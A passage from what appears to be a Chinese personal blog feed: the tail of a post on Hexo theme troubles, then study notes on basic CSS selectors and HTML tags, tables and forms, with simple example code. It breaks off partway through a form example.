<h1 id="二、搭建博客时遇到的一些问题"><a href="#二、搭建博客时遇到的一些问题" class="headerlink" title="二、搭建博客时遇到的一些问题"></a>二、搭建博客时遇到的一些问题</h1><p>博客的普通搭建还是非常简单的，基本就是按照网上的教程来就不会有什么问题的，主要就是主题的配置，这才是最难的。本来我是想着，主题这肯定就是要选个特别好看的啊，这样才炫，所以就选择了ParticleX这个主题，配置完了发现的确很炫啊，然后过了一段时间，我打算吧分类、标签什么的去弄好的时候，就发现也不知道为什么识别不出来创建页面的类型，试了好多方法都不行，就重新搭了，然后就更惨了，发现链代码块都识别错误了，完全没发用，又试了好几次，发现都不行，只能换成最通用的next主题了，😭，不过next主题其实也还不错，稳定而且功能什么的开发的都很全，网上教程很全，又费了一段时间也算成功搭好了。</p>
<h1 id="三、一些小建议"><a href="#三、一些小建议" class="headerlink" title="三、一些小建议"></a>三、一些小建议</h1><p>建议要是很有时间的话就是挑自己喜欢的博客吧，慢慢改改这最后肯定还是很炫的，不是那么在意外观的感觉next就很够用了，至少各种功能方便去配置。还有就是hexo我感觉相对WordPress是没有WordPress方便操作的，毕竟那个还有操作的界面什么的，当然，这也还是主要看个人选择。最重要的不在博客的外观，而在于内容，内容好才是真正好的博客！</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>java学习历程记录-前端基础</title>
    <url>/2023/11/21/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>其实java是之前一段时间学习的，但是学到一半的时候发现我的python能力不行，所以又转去学python了，然后又由于我之前没有记笔记的习惯，就导致我现在再回来看java，就基本上忘光了，所以想着借着写博客的功夫去将我的一些java学习历程记录下来，也能去好好的复习一下之前的知识。所以这篇文章并不主要是为了入门，更多的只是我自己的一个学习记录，仅限参考。</p>
<span id="more"></span>

<h1 id="一、一些基础的前端知识"><a href="#一、一些基础的前端知识" class="headerlink" title="一、一些基础的前端知识"></a>一、一些基础的前端知识</h1><h2 id="1、css中的元素选择器"><a href="#1、css中的元素选择器" class="headerlink" title="1、css中的元素选择器:"></a>1、css中的元素选择器:</h2><p>顾名思义：选择器是选取需设置样式的元素（标签），但是我们根据业务场景不同，选择的标签的需求也是多种多样的，所以选择器有很多种，因为我们是做后台开发的，所以对于css选择器，我们只学习最基本的3种。</p>
<p><strong>选择器通用语法如下</strong>：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">选择器名   &#123;</span><br><span class="line">    css样式名：css样式值;</span><br><span class="line">    css样式名：css样式值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要学习的3种选择器是元素选择器，id选择器，class选择器，语法以及作用如下：</p>
<h3 id="1-元素（标签）选择器："><a href="#1-元素（标签）选择器：" class="headerlink" title="1.元素（标签）选择器："></a><strong>1.元素（标签）选择器：</strong></h3><ul>
<li>选择器的名字必须是标签的名字</li>
<li>作用：选择器中的样式会作用于所有同名的标签上</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">元素名称 &#123;</span><br><span class="line">    css样式名:css样式值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-id选择器"><a href="#2-id选择器" class="headerlink" title="2.id选择器:"></a><strong>2.id选择器:</strong></h3><ul>
<li>选择器的名字前面需要加上#</li>
<li>作用：选择器中的样式会作用于指定id的标签上，而且有且只有一个标签（由于id是唯一的）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#id属性值 &#123;</span><br><span class="line">    css样式名:css样式值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#did</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-类选择器："><a href="#3-类选择器：" class="headerlink" title="3.类选择器："></a><strong>3.类选择器：</strong></h3><ul>
<li>选择器的名字前面需要加上 .</li>
<li>作用：选择器中的样式会作用于所有class的属性值和该名字一样的标签上，可以是多个</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.class属性值 &#123;</span><br><span class="line">    css样式名:css样式值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.cls</span>&#123;</span><br><span class="line">     <span class="attribute">color</span>: green;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="2、一些常见的html标签"><a href="#2、一些常见的html标签" class="headerlink" title="2、一些常见的html标签"></a>2、一些常见的html标签</h2><h3 id="1-视频、音频标签"><a href="#1-视频、音频标签" class="headerlink" title="1). 视频、音频标签"></a><strong>1). 视频、音频标签</strong></h3><ul>
<li><p>视频标签: &lt;video&gt;</p>
<ul>
<li>属性: <ul>
<li>src: 规定视频的url</li>
<li>controls: 显示播放控件</li>
<li>width: 播放器的宽度</li>
<li>height: 播放器的高度</li>
</ul>
</li>
</ul>
</li>
<li><p>音频标签: &lt;audio&gt;</p>
<ul>
<li>属性:<ul>
<li>src: 规定音频的url</li>
<li>controls: 显示播放控件</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-段落标签"><a href="#2-段落标签" class="headerlink" title="2). 段落标签"></a><strong>2). 段落标签</strong></h3><ul>
<li><p>换行标签: &lt;br&gt;</p>
<ul>
<li>注意: 在HTML页面中,我们在编辑器中通过回车实现的换行, 仅仅在文本编辑器中会看到换行效果, 浏览器是不会解析的, HTML中换行需要通过br标签</li>
</ul>
</li>
<li><p>段落标签: &lt;p&gt;</p>
<ul>
<li>如: &lt;p&gt; 这是一个段落 &lt;&#x2F;p&gt;</li>
</ul>
</li>
</ul>
<h3 id="3-文本格式标签"><a href="#3-文本格式标签" class="headerlink" title="3). 文本格式标签"></a><strong>3). 文本格式标签</strong></h3><table>
<thead>
<tr>
<th>效果</th>
<th>标签</th>
<th>标签(强调)</th>
</tr>
</thead>
<tbody><tr>
<td>加粗</td>
<td>b</td>
<td>strong</td>
</tr>
<tr>
<td>倾斜</td>
<td>i</td>
<td>em</td>
</tr>
<tr>
<td>下划线</td>
<td>u</td>
<td>ins</td>
</tr>
<tr>
<td>删除线</td>
<td>s</td>
<td>del</td>
</tr>
</tbody></table>
<p>前面的标签 b、i、u、s 就仅仅是实现加粗、倾斜、下划线、删除线的效果，是没有强调语义的。 而后面的strong、em、ins、del在实现加粗、倾斜、下划线、删除线的效果的同时，还带有强调语义。</p>
<blockquote>
<p>注意事项: </p>
<ul>
<li><p>在HTML页面中无论输入了多少个空格, 最多只会显示一个。 可以使用空格占位符（&amp;nbsp；）来生成空格，如果需要多个空格，就使用多次占位符。</p>
</li>
<li><p>那在HTML中，除了空格占位符以外，还有一些其他的占位符(了解, 只需要知道空格的占位符写法即可)，如下：</p>
<ul>
<li><table>
<thead>
<tr>
<th align="left">显示结果</th>
<th align="left">描述</th>
<th align="left">占位符</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left">空格</td>
<td align="left">&amp;nbsp;</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">小于号</td>
<td align="left">&amp;lt;</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">大于号</td>
<td align="left">&amp;gt;</td>
</tr>
<tr>
<td align="left">&amp;</td>
<td align="left">和号</td>
<td align="left">&amp;amp;</td>
</tr>
<tr>
<td align="left">“</td>
<td align="left">引号</td>
<td align="left">&amp;quot;</td>
</tr>
<tr>
<td align="left">‘</td>
<td align="left">撇号</td>
<td align="left">&amp;apos;</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="4-布局美化"><a href="#4-布局美化" class="headerlink" title="4).布局美化"></a>4).布局美化</h3><h4 id="①盒子模型"><a href="#①盒子模型" class="headerlink" title="①盒子模型"></a>①盒子模型</h4><ul>
<li><p>盒子：页面中所有的元素（标签），都可以看做是一个 盒子，由盒子将页面中的元素包含在一个矩形区域内，通过盒子的视角更方便的进行页面布局</p>
</li>
<li><p>盒子模型组成：内容区域（content）、内边距区域（padding）、边框区域（border）、外边距区域（margin）</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f529eda86837643eb1ca32955d5c36f6--cead--image-20230310092820616.png" alt="image-20230310092820616"></p>
<p>CSS盒子模型，其实和日常生活中的包装盒是非常类似的，就比如：</p>
<p> <img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/0f2a5351ad32ffa9c1fe2588bec73ffd--df3d--image-20230310093247265.png" alt="image-20230310093247265"></p>
<p>盒子的大小，其实就包括三个部分： border、padding、content，而margin外边距是不包括在盒子之内的。</p>
<p>盒子模型代码示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>盒子模型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;  <span class="comment">/* 宽度 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;  <span class="comment">/* 高度 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box; <span class="comment">/* 指定width height为盒子的高宽 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: aquamarine; <span class="comment">/* 背景色 */</span></span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span>; <span class="comment">/* 内边距, 上 右 下 左 , 边距都一行, 可以简写: padding: 20px;*/</span> </span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">10px</span> solid red; <span class="comment">/* 边框, 宽度 线条类型 颜色 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span>; <span class="comment">/* 外边距, 上 右 下 左 , 边距都一行, 可以简写: margin: 30px; */</span></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/4d2ca694e5a1c402d403f1a675b553da--1cdb--image-20231121183250787.png" alt="image-20231121183250787"></p>
<h4 id="②布局标签"><a href="#②布局标签" class="headerlink" title="②布局标签"></a>②布局标签</h4><ul>
<li><p>布局标签：实际开发网页中，会大量频繁的使用 div 和 span 这两个没有语义的布局标签。</p>
</li>
<li><p>标签：<div> <span></p>
</li>
<li><p>特点：</p>
<ul>
<li><p>div标签：</p>
<ul>
<li><p>一行只显示一个（独占一行）</p>
</li>
<li><p>宽度默认是父元素的宽度，高度默认由内容撑开</p>
</li>
<li><p>可以设置宽高（width、height）</p>
</li>
</ul>
</li>
<li><p>span标签：</p>
<ul>
<li><p>一行可以显示多个</p>
</li>
<li><p>宽度和高度默认由内容撑开</p>
</li>
<li><p>不可以设置宽高（width、height）</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-表格标签"><a href="#5-表格标签" class="headerlink" title="5).表格标签"></a>5).表格标签</h3><p><strong>标签：</strong></p>
<ul>
<li><p>&lt;table&gt; : 用于定义整个表格, 可以包裹多个 &lt;tr&gt;， 常用属性如下： </p>
<ul>
<li>border：规定表格边框的宽度</li>
<li>width：规定表格的宽度</li>
<li>cellspacing: 规定单元之间的空间</li>
</ul>
</li>
<li><p>&lt;tr&gt; : 表格的行，可以包裹多个 &lt;td&gt;  </p>
</li>
<li><p>&lt;td&gt; : 表格单元格(普通)，可以包裹内容 , 如果是表头单元格，可以替换为 &lt;th&gt;</p>
</li>
</ul>
<p><strong>演示：</strong></p>
<p>代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-表格<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center; <span class="comment">/* 单元格内容居中展示 */</span></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;0&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;600px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>序号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>品牌Logo<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>品牌名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>企业名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/huawei.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>华为<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>华为技术有限公司<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/alibaba.jpg&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>阿里<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>阿里巴巴集团控股有限公司<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开浏览器，效果如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/582d460a041f8a2b306cebd22a6333f9--f915--image-20231121183451283.png" alt="image-20231121183451283"></p>
<p>整合表格使用 table 标签包裹 , 其中的每一行数据都是一个 tr , 每一行中的每一个单元格都是一个 td , 而如果是表头单元格, 可以使用 th (具有加粗居中展示的效果)。</p>
<h3 id="6-表单标签（数据提交）"><a href="#6-表单标签（数据提交）" class="headerlink" title="6).表单标签（数据提交）"></a>6).表单标签（数据提交）</h3><p>那表单呢,在我们日常的上网的过程中,基本上每天都会遇到。比如，我们经常在访问网站时，出现的登录页面、注册页面、个人信息提交页面，其实都是一个一个的表单 。 当我们在这些表单中录入数据之后，一点击 “提交”，就会将表单中我们填写的数据采集到，并提交， 那其实这个数据呢，一般会提交到服务端，最终保存在数据库中 （后面的课程中会讲到）。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/158ab888ad88adfdda5cce236171acbc--b1b4--image-20231121183623494.png"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f0994b8edc9b5e7ce1a8ad860729d313--0da3--image-20231121183653494.png" alt="image-20231121183653494"></p>
<p>那其实，上述的整个窗口是一个表单，而表单是一项一项的，这个我们称为表单项 或 表单元素。</p>
<ul>
<li><p>表单场景: 表单就是在网页中负责数据采集功能的，如：注册、登录的表单。 </p>
</li>
<li><p>表单标签: &lt;form&gt;</p>
</li>
<li><p>表单属性:</p>
<ul>
<li>action: 规定表单提交时，向何处发送表单数据，表单提交的URL。</li>
<li>method: 规定用于发送表单数据的方式，常见为： GET、POST。<ul>
<li>GET：表单数据是拼接在url后面的， 如： xxxxxxxxxxx?username&#x3D;Tom&amp;age&#x3D;12，url中能携带的表单数据大小是有限制的。</li>
<li>POST： 表单数据是在请求体（消息体）中携带的，大小没有限制。</li>
</ul>
</li>
</ul>
</li>
<li><p>表单项标签: 不同类型的input元素、下拉列表、文本域等。</p>
<ul>
<li>input: 定义表单项，通过type属性控制输入形式</li>
<li>select: 定义下拉列表</li>
<li>textarea: 定义文本域</li>
</ul>
</li>
</ul>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    form表单属性: </span></span><br><span class="line"><span class="comment">        action: 表单提交的url, 往何处提交数据 . 如果不指定, 默认提交到当前页面</span></span><br><span class="line"><span class="comment">        method: 表单的提交方式 .</span></span><br><span class="line"><span class="comment">            get: 在url后面拼接表单数据, 比如: ?username=Tom&amp;age=12 , url长度有限制 . 默认值</span></span><br><span class="line"><span class="comment">            post: 在消息体(请求体)中传递的, 参数大小无限制的.</span></span><br><span class="line"><span class="comment">    --&gt;</span>   </span><br><span class="line">	</span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get/post&quot;</span>&gt;</span>   #表单提交方式的修改</span><br><span class="line">        用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">        年龄: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>表单中的所有表单项，要想能够正常的采集数据，在提交的时候能提交到服务端，表单项必须指定name属性。 否则，无法提交该表单项。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-表单的拓展使用"><a href="#7-表单的拓展使用" class="headerlink" title="7).表单的拓展使用"></a>7).表单的拓展使用</h3><p>在一个表单中，可以存在很多的表单项，而虽然表单项的形式各式各样，但是表单项的标签其实就只有三个，分别是：</p>
<ul>
<li><p>&lt;input&gt;: 表单项 , 通过type属性控制输入形式。</p>
<table>
<thead>
<tr>
<th>type取值</th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td>默认值，定义单行的输入字段</td>
</tr>
<tr>
<td>password</td>
<td>定义密码字段</td>
</tr>
<tr>
<td>radio</td>
<td>定义单选按钮</td>
</tr>
<tr>
<td>checkbox</td>
<td>定义复选框</td>
</tr>
<tr>
<td>file</td>
<td>定义文件上传按钮</td>
</tr>
<tr>
<td>date&#x2F;time&#x2F;datetime-local</td>
<td>定义日期&#x2F;时间&#x2F;日期时间</td>
</tr>
<tr>
<td>number</td>
<td>定义数字输入框</td>
</tr>
<tr>
<td>email</td>
<td>定义邮件输入框</td>
</tr>
<tr>
<td>hidden</td>
<td>定义隐藏域</td>
</tr>
<tr>
<td>submit &#x2F; reset &#x2F; button</td>
<td>定义提交按钮 &#x2F; 重置按钮 &#x2F; 可点击按钮</td>
</tr>
</tbody></table>
</li>
<li><p>&lt;select&gt;: 定义下拉列表, &lt;option&gt; 定义列表项</p>
</li>
<li><p>&lt;textarea&gt;: 文本域</p>
</li>
</ul>
<p>示例：</p>
<p>创建一个新的表单项的html文件，具体内容如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-表单项标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- value: 表单项提交的值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">     姓名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span> </span><br><span class="line">     性别: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span> 男</span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span> 女 <span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     爱好: <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;java&quot;</span>&gt;</span> java <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;game&quot;</span>&gt;</span> game <span class="tag">&lt;/<span 